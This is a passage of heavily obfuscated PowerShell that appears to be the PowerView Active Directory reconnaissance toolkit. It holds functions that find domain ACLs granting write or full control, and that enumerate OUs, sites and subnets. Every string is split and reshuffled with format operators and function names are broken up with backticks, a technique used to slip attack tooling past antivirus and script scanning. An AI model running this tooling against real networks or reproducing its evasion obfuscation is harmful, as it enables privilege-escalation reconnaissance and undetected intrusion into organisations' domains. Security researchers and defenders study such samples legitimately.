        if (  $PSBoundParameters[( "{3}{0}{1}{2}" -f'lt','PageSi','ze','Resu' )]) { $ACLArguments[("{0}{1}{2}{3}"-f'Re','su','ltPageSi','ze'  )]   = $ResultPageSize }
        if (  $PSBoundParameters[(  "{1}{2}{3}{0}{4}"-f 'i','S','erver','T','meLimit' )]) { $ACLArguments[( "{0}{3}{4}{1}{2}" -f'Serve','imi','t','rTime','L' )]   =   $ServerTimeLimit }
        if ($PSBoundParameters[( "{0}{1}{2}"-f'To','mbston','e')] ) { $ACLArguments[( "{1}{0}{2}"-f'n','Tombsto','e')] =  $Tombstone }
        if ( $PSBoundParameters[("{0}{1}{2}" -f 'Crede','ntia','l' )] ) { $ACLArguments[( "{0}{3}{2}{1}"-f'Crede','al','i','nt')]  = $Credential }

        $ObjectSearcherArguments   =  @{
            ( "{0}{2}{1}" -f 'Pro','ies','pert')  =   ( "{4}{5}{3}{0}{2}{1}"-f 'a','ctclass','me,obje','tn','s','amaccoun')
            'Raw'   = $True
        }
        if ( $PSBoundParameters[( "{0}{1}"-f'S','erver' )]) { $ObjectSearcherArguments[("{1}{0}" -f 'ver','Ser')]  =  $Server }
        if (  $PSBoundParameters[( "{3}{1}{0}{2}"-f'p','earchSco','e','S' )]) { $ObjectSearcherArguments[("{2}{1}{0}" -f'Scope','h','Searc'  )] =   $SearchScope }
        if (  $PSBoundParameters[("{2}{3}{0}{1}"-f 'z','e','Result','PageSi')]) { $ObjectSearcherArguments[("{1}{0}{2}{3}" -f 'Pa','Result','g','eSize')]   =   $ResultPageSize }
        if ( $PSBoundParameters[( "{1}{3}{2}{0}" -f'mit','Server','meLi','Ti')]  ) { $ObjectSearcherArguments[( "{1}{3}{2}{0}{4}" -f'm','Serve','Li','rTime','it')]   =  $ServerTimeLimit }
        if (  $PSBoundParameters[( "{2}{1}{0}"-f'one','ombst','T')]  ) { $ObjectSearcherArguments[( "{2}{0}{1}"-f's','tone','Tomb'  )]  =   $Tombstone }
        if ( $PSBoundParameters[( "{2}{1}{0}"-f'l','dentia','Cre' )] ) { $ObjectSearcherArguments[("{2}{1}{0}"-f'ential','d','Cre')]  = $Credential }

        $ADNameArguments  =   @{}
        if ( $PSBoundParameters[(  "{2}{0}{1}" -f 'er','ver','S' )] ) { $ADNameArguments[(  "{0}{2}{1}"-f 'Se','er','rv')]  =  $Server }
        if (  $PSBoundParameters[(  "{1}{2}{0}{3}" -f 'nti','Cred','e','al' )]) { $ADNameArguments[( "{0}{2}{1}" -f'Crede','ial','nt' )]   = $Credential }

        
        $ResolvedSIDs =   @{}
    }

    PROCESS {
        if ( $PSBoundParameters[(  "{1}{0}"-f 'ain','Dom')]  ) {
            $ACLArguments[(  "{0}{1}" -f 'Domai','n'  )]  = $Domain
            $ADNameArguments[("{2}{1}{0}" -f'ain','om','D' )] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments |  ForEach-Object {

            if (  (  $_.acTiVedIREcTORYRIghts -match ( ( ( "{5}{3}{0}{2}{1}{6}{4}{8}{7}" -f 'ericAll17wW','7wC','rite1','en','eate17','G','r','te','wDele' ))-rePLaCE'17w',[chAR]124) ) -or ( (  $_.AcTIVeDiReCTOryrigHts -match ("{2}{3}{1}{0}"-f'ght','i','Ex','tendedR' ) ) -and ($_.ACeQUaliFIEr -match ( "{1}{0}"-f 'w','Allo'  ) ) )  ) {
                
                if (  $_.SeCURITyiDeNTifIer.vAlUe -match '^S-1-5-.*-[1-9]\d{3,}$' ) {
                    if (  $ResolvedSIDs[$_.seCUrItyIDeNTIfIER.VAlUE]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass   = $ResolvedSIDs[$_.SecuRitYiDEntIFieR.vALUE]

                        $InterestingACL   = New-Object ('PSObj'+ 'ect'  )
                        $InterestingACL  |   Add-Member (  'N' +  'o' + 'teProperty'  ) (  "{1}{0}" -f 'N','ObjectD') $_.objEcTdN
                        $InterestingACL  |  Add-Member ('N'  +'o' + 'teProperty'  ) (  "{0}{2}{1}"-f 'A','er','ceQualifi'  ) $_.aCEQUAlIFieR
                        $InterestingACL  | Add-Member ('No'+'t'+ 'eProper'+  'ty') ("{1}{2}{0}{3}"-f'R','Act','iveDirectory','ights') $_.actiVEDirEcTorYrights
                        if ( $_.OBjEcTAcetYpe  ) {
                            $InterestingACL   |  Add-Member ('NoteProper' + 't' +  'y' ) ("{1}{0}{2}"-f 'ctAce','Obje','Type'  ) $_.OBjEcTACETyPE
                        }
                        else {
                            $InterestingACL   |  Add-Member ('NotePr'+  'o'  +'pe' + 'rty' ) ( "{4}{0}{1}{2}{3}"-f 't','Ace','Typ','e','Objec') ( "{0}{1}" -f'Non','e'  )
                        }
                        $InterestingACL  |  Add-Member (  'N' +  'otePro' +  'pe' + 'rty') (  "{1}{0}"-f 's','AceFlag'  ) $_.ACEFlaGS
                        $InterestingACL |  Add-Member ( 'Note'  + 'Prope' + 'rt' +'y' ) (  "{0}{2}{1}" -f'Ac','e','eTyp'  ) $_.ACETYpe
                        $InterestingACL |  Add-Member ( 'N'+'oteProp' +'erty') (  "{3}{2}{1}{0}"-f'ags','nceFl','erita','Inh') $_.InheRITanCEFlags
                        $InterestingACL   |   Add-Member ('NotePr'+ 'op' +  'er'+  'ty' ) (  "{3}{1}{0}{2}" -f'rityIden','ecu','tifier','S'  ) $_.SECuRItyidEnTIfiEr
                        $InterestingACL |  Add-Member (  'No' + 'tePropert'+  'y'  ) ("{3}{4}{2}{0}{1}" -f'Na','me','rence','Identi','tyRefe' ) $IdentityReferenceName
                        $InterestingACL   |  Add-Member ( 'N'  +  'o'  + 'tePrope'+'rty' ) ("{3}{1}{2}{4}{0}{5}" -f'enceD','enti','ty','Id','Refer','omain') $IdentityReferenceDomain
                        $InterestingACL |  Add-Member (  'Not' +'ePropert'  + 'y') (  "{4}{0}{2}{1}{3}"-f'enti','nce','tyRefere','DN','Id') $IdentityReferenceDN
                        $InterestingACL | Add-Member (  'Note'  + 'Prope'  +'r'+  'ty' ) ( "{2}{4}{0}{1}{3}" -f'yR','eferenc','Ident','eClass','it') $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN =  Convert-ADName -Identity $_.sEcURITyIdeNtifIER.VaLUE -OutputType ( 'DN'  ) @ADNameArguments
                        

                        if (  $IdentityReferenceDN) {
                            $IdentityReferenceDomain   =   $IdentityReferenceDN.suBstRING( $IdentityReferenceDN.INdexOf( 'DC='  ) ) -replace 'DC=','' -replace ',','.'
                            
                            $ObjectSearcherArguments[( "{1}{0}" -f 'ain','Dom'  )]  =   $IdentityReferenceDomain
                            $ObjectSearcherArguments[(  "{0}{1}{2}" -f 'I','d','entity')]  =   $IdentityReferenceDN
                            
                            $Object  =   Get-DomainObject @ObjectSearcherArguments

                            if ($Object ) {
                                $IdentityReferenceName  =   $Object.proPerTies.SAMaccounTnaME[0]
                                if ( $Object.pRoPERTIes.oBjeCTcLasS -match ( "{1}{2}{0}"-f'uter','com','p' ) ) {
                                    $IdentityReferenceClass  =  ( "{2}{1}{0}"-f 'ter','mpu','co' )
                                }
                                elseif (  $Object.prOpERTIES.oBJEctcLasS -match (  "{1}{0}"-f'oup','gr') ) {
                                    $IdentityReferenceClass   =  ("{0}{1}"-f'gr','oup' )
                                }
                                elseif ( $Object.prOPerTies.ObjECTCLASs -match ("{1}{0}" -f'er','us')) {
                                    $IdentityReferenceClass   = (  "{1}{0}"-f'er','us' )
                                }
                                else {
                                    $IdentityReferenceClass   =  $Null
                                }

                                
                                $ResolvedSIDs[$_.seCURiTyIdeNTIfIEr.vaLue] =  $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL   =  New-Object ( 'P' +  'SObjec'  +'t' )
                                $InterestingACL  |  Add-Member (  'NotePr'  +'opert' +'y'  ) ("{1}{2}{0}"-f'ctDN','Ob','je') $_.objECTdN
                                $InterestingACL  |  Add-Member ('N' +'otePr' +'o' +'perty'  ) ( "{2}{0}{3}{1}" -f 'al','er','AceQu','ifi') $_.aCeQUALifiER
                                $InterestingACL   |  Add-Member ( 'Not'  +'ePro'+  'pert'+ 'y' ) (  "{3}{0}{1}{2}{5}{4}" -f'ctiv','eDir','ect','A','yRights','or'  ) $_.AcTiVedIRECTOryriGHTS
                                if ( $_.ObjeCtACETYPE ) {
                                    $InterestingACL  | Add-Member ('NotePro'+'pe'  + 'rt'  + 'y'  ) ("{3}{4}{2}{1}{0}"-f 'ype','T','tAce','Obj','ec'  ) $_.objectACETyPE
                                }
                                else {
                                    $InterestingACL   |   Add-Member ( 'Note'+  'Pr' +'oper'+  'ty') (  "{1}{0}{2}"-f'A','Object','ceType') ("{0}{1}" -f 'No','ne' )
                                }
                                $InterestingACL  | Add-Member ( 'Not' + 'eP'+'roper'  +  'ty'  ) ("{2}{0}{1}" -f'ceF','lags','A') $_.AceFlAgs
                                $InterestingACL  |  Add-Member (  'Not' + 'ePrope' + 'rty'  ) ("{1}{0}"-f'eType','Ac') $_.ACETYpe
                                $InterestingACL  |  Add-Member ('N' +'ot' +'eProp'  +'erty' ) ( "{0}{2}{1}{3}"-f 'Inherita','Flag','nce','s' ) $_.iNheriTANcefLaGS
                                $InterestingACL   | Add-Member ('NotePr'+'o'+ 'perty' ) ( "{2}{3}{0}{4}{1}"-f'i','r','SecurityIden','tif','e' ) $_.SeCuriTyiDENtIfIEr
                                $InterestingACL  |   Add-Member ('Not' +'eProp'  + 'erty'  ) ( "{1}{2}{4}{0}{3}" -f'tyRe','Id','en','ferenceName','ti'  ) $IdentityReferenceName
                                $InterestingACL   |   Add-Member ( 'NoteP'  + 'r'+'operty') ("{3}{5}{4}{0}{1}{2}"-f 'om','a','in','Ide','erenceD','ntityRef') $IdentityReferenceDomain
                                $InterestingACL  |   Add-Member ( 'N'  + 'otePr' +  'oper' + 'ty'  ) ( "{0}{1}{4}{2}{3}{5}"-f'Iden','t','ty','Refere','i','nceDN') $IdentityReferenceDN
                                $InterestingACL  |   Add-Member (  'Note' + 'Prope' +'rty' ) (  "{0}{5}{3}{2}{1}{4}" -f 'I','eCla','ityReferenc','t','ss','den'  ) $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function ge`T-DOM`AI`NOu {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{1}{3}{2}"-f 'PS','Sho','ocess','uldPr'}, ''  )]
    [OutputType(  {"{0}{3}{2}{1}" -f'P','w.OU','ie','owerV'})]
    [CmdletBinding(  )]
    Param (
        [Parameter( posiTIOn   =  0, VALUEfROMpiPeLInE =   $True, VaLUEfroMpIPeLINEbypRoPErtYNAmE  =   $True  )]
        [Alias( {"{0}{1}" -f 'N','ame'}  )]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        [Alias({"{0}{1}" -f 'G','UID'} )]
        $GPLink,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{0}" -f'ter','Fil'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{0}" -f 'h','ADSPat'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{0}{2}{3}{1}" -f 'DomainC','er','on','troll'}  )]
        [String]
        $Server,

        [ValidateSet( {"{1}{0}"-f'ase','B'}, {"{0}{1}" -f 'OneLeve','l'}, {"{0}{2}{1}"-f 'S','ree','ubt'})]
        [String]
        $SearchScope   = ("{2}{0}{1}" -f'btre','e','Su' ),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize  =   200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}" -f 'Da','cl'}, {"{0}{1}" -f'G','roup'}, {"{1}{0}" -f 'one','N'}, {"{1}{0}"-f'wner','O'}, {"{0}{1}"-f'Sac','l'} )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(  {"{2}{1}{0}" -f'One','n','Retur'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  =   [Management.Automation.PSCredential]::EmPTy,

        [Switch]
        $Raw
     )

    BEGIN {
        $SearcherArguments  = @{}
        if ($PSBoundParameters[("{0}{1}"-f 'Dom','ain'  )]  ) { $SearcherArguments[(  "{0}{1}" -f'Dom','ain')] =  $Domain }
        if (  $PSBoundParameters[(  "{1}{0}{2}"-f 'rtie','Prope','s')]) { $SearcherArguments[(  "{1}{2}{0}" -f 'ies','Proper','t'  )] = $Properties }
        if ($PSBoundParameters[( "{2}{1}{3}{0}"-f'hBase','ar','Se','c')]) { $SearcherArguments[( "{2}{1}{0}" -f 'ase','earchB','S'  )]   =   $SearchBase }
        if (  $PSBoundParameters[( "{1}{0}" -f 'erver','S' )]) { $SearcherArguments[( "{0}{1}" -f'Ser','ver' )]   = $Server }
        if (  $PSBoundParameters[(  "{3}{1}{0}{2}" -f 'rch','ea','Scope','S' )]) { $SearcherArguments[( "{1}{2}{0}" -f'chScope','S','ear' )]   =  $SearchScope }
        if (  $PSBoundParameters[( "{1}{3}{0}{2}"-f 'PageSiz','R','e','esult'  )]) { $SearcherArguments[("{1}{3}{0}{2}{4}" -f'Pag','Resu','eSi','lt','ze')]  =  $ResultPageSize }
        if ( $PSBoundParameters[(  "{2}{1}{0}"-f'Limit','erverTime','S')]) { $SearcherArguments[(  "{1}{3}{0}{2}{4}"-f'ver','Se','TimeLimi','r','t'  )]   =   $ServerTimeLimit }
        if ( $PSBoundParameters[(  "{0}{2}{1}"-f 'Sec','tyMasks','uri' )]  ) { $SearcherArguments[("{2}{1}{0}"-f'ks','Mas','Security')] =   $SecurityMasks }
        if (  $PSBoundParameters[(  "{0}{2}{1}{3}" -f 'Tom','n','bsto','e')]) { $SearcherArguments[("{0}{2}{1}" -f'Tombs','e','ton'  )]   =   $Tombstone }
        if ($PSBoundParameters[("{1}{0}{2}"-f'enti','Cred','al')] ) { $SearcherArguments[(  "{1}{0}{2}" -f 'ent','Cred','ial' )] = $Credential }
        $OUSearcher  =  Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter =   ''
            $Filter   =  ''
            $Identity  | Where-Object {$_} |   ForEach-Object {
                $IdentityInstance   =   $_.rePlacE('(', '\28'  ).REplaCE( ')', '\29' )
                if ( $IdentityInstance -match (  "{1}{0}"-f 'OU=.*','^'  ) ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((  -not $PSBoundParameters[( "{0}{1}"-f'Dom','ain')] ) -and ( -not $PSBoundParameters[("{0}{2}{1}" -f 'S','se','earchBa'  )] ) ) {
                        
                        
                        $IdentityDomain =   $IdentityInstance.SuBstrinG(  $IdentityInstance.IndEXoF('DC='  ) ) -replace 'DC=','' -replace ',','.'
                        Write-Verbose (  '[Ge' + 't-Do' +  'main' + 'OU'  +  '] '  +  'Ex'+ 't'  +'racted'+  ' '  +  'doma' +  'in '  + "'$IdentityDomain' "  + 'f' + 'rom '+  "'$IdentityInstance'" )
                        $SearcherArguments[(  "{1}{0}" -f'omain','D'  )]   = $IdentityDomain
                        $OUSearcher   =  Get-DomainSearcher @SearcherArguments
                        if ( -not $OUSearcher  ) {
                            Write-Warning ( '[G'  +  'et-'  +  'Dom'+ 'ain'  +  'OU] '  + 'Unable' +' ' + 't' +'o '+ 'retrie' +'ve ' + 'd'+'omai'+  'n '+'s' +  'ea' +'rc'  +  'her '+'f'+'or '  +"'$IdentityDomain'" )
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString =   (-Join ( ( [Guid]$IdentityInstance ).toBYteaRRAY(   ) | ForEach-Object {$_.TostrING( 'X' ).PADleFT( 2,'0')}) ) -Replace ( "{0}{1}" -f'(.','.)'),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ( $IdentityFilter -and (  $IdentityFilter.TRIm( ) -ne ''  )  ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[( "{1}{0}"-f 'PLink','G')]  ) {
                Write-Verbose ('[' +  'Get-Doma'  + 'inOU'  + '] '+  'S'+  'ea'  + 'rching'  +  ' ' + 'for' +  ' '  + 'OUs'  +  ' '+  'with' + ' '+"$GPLink "+  'set' +' '+  'i'  +  'n '+'the'+' '  + 'gpLin' +  'k'+ ' '  +'propert'  +'y' )
                $Filter += "(gplink=*$GPLink*)"
            }

            if ( $PSBoundParameters[( "{0}{1}{2}" -f'LDAP','F','ilter' )]  ) {
                Write-Verbose ( '[Get-D' +'oma' + 'inOU] ' +  'Usin' +  'g '  +  'additi' + 'onal'+' ' +'LD'+ 'AP ' +  'fil'  + 't' +  'er: '  +  "$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.FilTEr =   "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if ($PSBoundParameters[( "{1}{0}" -f 'dOne','Fin' )]  ) { $Results   =   $OUSearcher.fINdONe(   ) }
            else { $Results   =   $OUSearcher.fIndalL( ) }
            $Results  |  Where-Object {$_}   |   ForEach-Object {
                if ( $PSBoundParameters['Raw']) {
                    
                    $OU  = $_
                }
                else {
                    $OU  =  Convert-LDAPProperty -Properties $_.PropeRTies
                }
                $OU.psobjEct.typENAmes.InSERt(  0, (  "{1}{3}{0}{2}" -f'erV','Po','iew.OU','w'  ))
                $OU
            }
            if ( $Results) {
                try { $Results.dispOSe() }
                catch {
                    Write-Verbose ( '[Get' +'-DomainO'  + 'U]'  + ' ' + 'Err' +'or '  +  'disposi' +'n' +'g '  +  'o'  +'f '+  'th'  +'e '  + 'Resu'+ 'lts '  + 'o'  +'bje'  +  'ct: '+ "$_" )
                }
            }
            $OUSearcher.DIsPOSE(  )
        }
    }
}


function G`eT-DOmains`ITE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'dProcess','houl','PSS'}, '' )]
    [OutputType(  {"{0}{4}{3}{2}{1}" -f 'Po','ite','w.S','ie','werV'})]
    [CmdletBinding( )]
    Param (
        [Parameter(poSItION =   0, vAluEFrOMpipeLiNe  =   $True, VALuEFROMpiPELINebyPRoPeRtYnaME   = $True  )]
        [Alias({"{0}{1}"-f'Na','me'} )]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        [Alias( {"{1}{0}" -f 'UID','G'} )]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{2}{0}{1}" -f 'te','r','Fil'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(   )]
        [Alias( {"{1}{0}"-f 'Path','ADS'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{4}{2}{3}{0}{1}"-f 'nCo','ntroller','oma','i','D'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f'Ba','se'}, {"{2}{1}{0}"-f 'l','eLeve','On'}, {"{1}{0}" -f 'ree','Subt'}  )]
        [String]
        $SearchScope  =  ( "{0}{1}"-f 'Subtr','ee' ),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize   =  200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{1}{0}" -f 'cl','Da'}, {"{1}{0}"-f 'up','Gro'}, {"{1}{0}" -f'ne','No'}, {"{1}{0}"-f 'wner','O'}, {"{0}{1}" -f'Sac','l'} )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(  {"{1}{0}{2}"-f'urnO','Ret','ne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =  [Management.Automation.PSCredential]::EMPTY,

        [Switch]
        $Raw
      )

    BEGIN {
        $SearcherArguments   =  @{
            (  "{3}{1}{0}{2}" -f 'sePr','earchBa','efix','S' ) = ( "{0}{3}{5}{1}{4}{6}{2}" -f'CN=Si','CN=C','n','t','onfigura','es,','tio'  )
        }
        if ( $PSBoundParameters[(  "{1}{2}{0}" -f'ain','D','om')] ) { $SearcherArguments[( "{2}{1}{0}"-f 'ain','m','Do'  )]  =  $Domain }
        if ($PSBoundParameters[("{1}{0}{2}"-f 'i','Propert','es'  )]  ) { $SearcherArguments[("{1}{2}{0}{3}" -f'e','P','roperti','s'  )]   = $Properties }
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Se','archBa','se')]  ) { $SearcherArguments[(  "{1}{0}{2}"-f 'a','Se','rchBase' )] =   $SearchBase }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Ser','ve','r'  )]) { $SearcherArguments[(  "{0}{1}{2}"-f 'Se','rv','er' )]  =   $Server }
        if ( $PSBoundParameters[("{0}{2}{1}"-f 'Sea','pe','rchSco'  )]) { $SearcherArguments[("{3}{2}{0}{1}"-f 'Sco','pe','rch','Sea')]  = $SearchScope }
        if (  $PSBoundParameters[(  "{2}{4}{3}{1}{0}" -f'eSize','ag','Resu','P','lt'  )] ) { $SearcherArguments[(  "{1}{3}{2}{0}" -f'eSize','Res','Pag','ult')]  =  $ResultPageSize }
        if ( $PSBoundParameters[(  "{0}{1}{4}{3}{2}" -f'S','erverTime','t','imi','L' )] ) { $SearcherArguments[( "{3}{1}{0}{2}"-f'rTimeLim','e','it','Serv' )] = $ServerTimeLimit }
        if (  $PSBoundParameters[( "{0}{2}{1}{3}"-f 'S','curit','e','yMasks'  )]  ) { $SearcherArguments[("{0}{2}{1}"-f'Secur','asks','ityM' )]  =  $SecurityMasks }
        if (  $PSBoundParameters[("{0}{2}{1}"-f 'To','ne','mbsto')]  ) { $SearcherArguments[("{1}{0}{2}"-f 'mbs','To','tone')] =   $Tombstone }
        if (  $PSBoundParameters[(  "{0}{1}{2}{3}" -f 'Cred','e','nt','ial' )]) { $SearcherArguments[("{1}{2}{3}{0}"-f'al','Crede','nt','i' )]  = $Credential }
        $SiteSearcher   = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter   =  ''
            $Filter  =   ''
            $Identity   |   Where-Object {$_}   |  ForEach-Object {
                $IdentityInstance  =  $_.replAce( '(', '\28'  ).REPlAcE(  ')', '\29')
                if (  $IdentityInstance -match ( "{1}{0}" -f'=.*','^CN' )  ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if (  (-not $PSBoundParameters[( "{1}{0}" -f 'main','Do'  )]  ) -and (  -not $PSBoundParameters[(  "{1}{2}{3}{0}"-f 'hBase','Sea','r','c'  )]  )) {
                        
                        
                        $IdentityDomain  =  $IdentityInstance.SubStriNG($IdentityInstance.iNdexOf( 'DC=' )) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Ge' +'t-D'+'omainS' +  'ite' + '] ' +  'Ext'+ 'racted'  + ' ' +'do' +'main '+  "'$IdentityDomain' " + 'from'  +  ' ' +"'$IdentityInstance'" )
                        $SearcherArguments[("{2}{0}{1}"-f 'a','in','Dom')]   =   $IdentityDomain
                        $SiteSearcher   = Get-DomainSearcher @SearcherArguments
                        if (  -not $SiteSearcher ) {
                            Write-Warning ( '[G' +'et-' +  'Do' +'mainSite]'  + ' '+'Unab' +'le '  +'to'+  ' ' +'retr'+  'iev'+'e ' +  'd' +'omai' +  'n '+  'se' + 'arc'  +'her '  + 'fo'  + 'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (  -Join ( ([Guid]$IdentityInstance  ).tOByTeArRAy(   )  |   ForEach-Object {$_.tOSTrING( 'X' ).PADlEft(  2,'0' )}  ) ) -Replace ( (  "{1}{0}"-f')','(..' )),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if (  $IdentityFilter -and ($IdentityFilter.TRIm( ) -ne ''  ) ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters[("{1}{0}"-f'Link','GP')]) {
                Write-Verbose (  '[Ge' +  't-D' + 'omainS'+ 'ite]'+ ' '  +'Se'+ 'a'  +  'rchin'  +'g '+'for' + ' ' +  'sit' +  'es ' + 'w'+'ith '+  "$GPLink "+  'set'  +  ' '  + 'i'+'n ' + 'the' +' ' +'gpLi' +'nk '  + 'prop'+'ert'  +  'y')
                $Filter += "(gplink=*$GPLink*)"
            }

            if ( $PSBoundParameters[("{2}{0}{1}" -f'te','r','LDAPFil'  )]) {
                Write-Verbose ( '[Get-Domai'+'nSi'+'te' + '] '  +'Usi' + 'ng ' +'a' + 'ddit'  + 'i'  +  'onal '+'LD'+  'AP '+  'filt' +'er' +': '+ "$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.FiLTER =   "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if ($PSBoundParameters[(  "{0}{2}{1}"-f'Fi','dOne','n')] ) { $Results =  $SiteSearcher.fIndall( ) }
            else { $Results =  $SiteSearcher.fiNdaLL(  ) }
            $Results  |  Where-Object {$_} |  ForEach-Object {
                if ( $PSBoundParameters['Raw'] ) {
                    
                    $Site   =   $_
                }
                else {
                    $Site   =  Convert-LDAPProperty -Properties $_.propertIES
                }
                $Site.pSOBJECt.TypEnAMeS.insErt(0, (  "{3}{1}{0}{4}{2}" -f 'w.','owerVie','te','P','Si'  ))
                $Site
            }
            if ($Results  ) {
                try { $Results.dISpoSE( ) }
                catch {
                    Write-Verbose ("{0}{2}{7}{1}{6}{5}{3}{4}{8}" -f '[Get-Dom','E','ainSit','ing o','f','spos','rror di','e] ',' the Results object')
                }
            }
            $SiteSearcher.DiSpOSE(    )
        }
    }
}


function gEt-doMA`In`s`UBNEt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{2}{0}{4}{3}"-f 'd','PS','Shoul','ess','Proc'}, '' )]
    [OutputType(  {"{2}{4}{1}{0}{3}" -f 'ew.Subne','Vi','Po','t','wer'})]
    [CmdletBinding(   )]
    Param (
        [Parameter(poSitION   = 0, vaLUEFrompipeline   =  $True, VaLUefrOMpIpELInebYProPErtYNaMe =  $True  )]
        [Alias( {"{1}{0}"-f'me','Na'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filte','r'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(    )]
        [Alias({"{0}{2}{1}" -f 'A','ath','DSP'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{1}{3}{0}{2}{4}" -f 'l','DomainCont','l','ro','er'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{2}{0}"-f 'vel','O','neLe'}, {"{0}{1}{2}" -f 'Sub','t','ree'} )]
        [String]
        $SearchScope  =  ( "{0}{1}"-f 'S','ubtree'),

        [ValidateRange( 1, 10000 )]
        [Int]
        $ResultPageSize  = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{0}{1}"-f'D','acl'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}"-f'Non','e'}, {"{1}{0}" -f'wner','O'}, {"{0}{1}"-f 'S','acl'} )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias( {"{0}{1}" -f'Re','turnOne'}  )]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =  [Management.Automation.PSCredential]::eMpty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments =   @{
            ("{0}{4}{1}{3}{2}{5}" -f 'Sea','c','a','hB','r','sePrefix')   = (  "{4}{1}{3}{6}{5}{2}{0}" -f 'uration','=Subnet','onfig','s,C','CN','ites,CN=C','N=S'  )
        }
        if (  $PSBoundParameters[(  "{1}{0}{2}"-f 'i','Doma','n')]  ) { $SearcherArguments[( "{2}{1}{0}" -f 'main','o','D' )] =   $Domain }
        if ($PSBoundParameters[(  "{1}{0}{2}" -f'ti','Proper','es' )]  ) { $SearcherArguments[(  "{2}{1}{0}{3}"-f 'ope','r','P','rties' )]  =  $Properties }
        if ( $PSBoundParameters[(  "{2}{3}{1}{0}" -f 'e','s','Sear','chBa')]) { $SearcherArguments[(  "{2}{3}{1}{0}" -f 'e','Bas','Searc','h' )]  = $SearchBase }
        if (  $PSBoundParameters[("{0}{1}"-f'Se','rver' )] ) { $SearcherArguments[(  "{1}{0}"-f 'erver','S'  )]  = $Server }
        if ($PSBoundParameters[(  "{1}{2}{0}" -f 'pe','Sea','rchSco' )] ) { $SearcherArguments[( "{0}{1}{2}{3}"-f'Searc','hSc','o','pe'  )]   =  $SearchScope }
